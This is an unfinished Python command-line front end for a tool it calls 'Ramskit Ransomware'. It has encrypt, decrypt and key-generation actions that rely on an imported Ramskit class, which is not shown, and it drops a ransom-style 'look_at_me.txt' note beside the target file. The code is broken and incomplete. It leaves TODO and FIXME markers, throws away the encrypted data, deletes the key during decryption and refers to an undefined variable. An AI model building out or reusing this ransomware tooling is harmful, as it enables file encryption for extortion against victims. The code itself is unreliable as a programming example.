#!/usr/bin/python3

""" Copyright (C) 2023 Luis De León

This program is free software: you can redistribute it and/or modify
it under the terms of the GNU General Public License as published by
the Free Software Foundation, either version 3 of the License, or
(at your option) any later version.

This program is distributed in the hope that it will be useful,
but WITHOUT ANY WARRANTY; without even the implied warranty of
MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
GNU General Public License for more details.

You should have received a copy of the GNU General Public License
along with this program.  If not, see <https://www.gnu.org/licenses/>. """


from ramskit import Ramskit
import os
import sys
import argparse


# TODO 1: Implement Ramskit class
# TODO 2: Check CLI args
def main() -> None:
    parser = argparse.ArgumentParser(description="Ramskit - CLI Tool for Ramskit Ransomware")
    parser.add_argument('-a', '--action', dest="action", required=True,
                        help='Action to perform [encrypt/decrypt/generate_key]')
    parser.add_argument('-p', '--path', dest="path", help='Path to file(s) to encrypt/decrypt')
    args = parser.parse_args()
    
    ramskit = Ramskit()
    key = ramskit.load_key()

    action = args.action.lower()
    path = args.path

    # FIXME 2: Encrypt/decrypt
    if action == 'encrypt':
        if not os.path.isfile(path):
            print(f"[x] The file {path} does not exist. Exiting...")
            sys.exit(1)

        # Implement all this stuff
        full_path = os.path.abspath(path)
        encrypted_file_path = os.path.join(os.path.dirname(full_path), 'look_at_me.txt')

        with open(full_path, 'rb') as file:
            encrypted_data = ramskit.encrypt_file(file.read(), key)

        with open(encrypted_file_path, 'w') as file:
            file.write('Heyo, this file has been encrypted!. \n\n')

    elif action == 'decrypt':
        # FIXME 4: Check and fix key
        os.remove(key)
        items.remove(key)
        ramskit.decrypt_file(items, key)
    elif action == 'generate_key':
        print(Ramskit.generate_key())
    else:
        raise Exception('Invalid action: ', action)


if __name__ == '__main__':
    main()
    sys.exit(0)
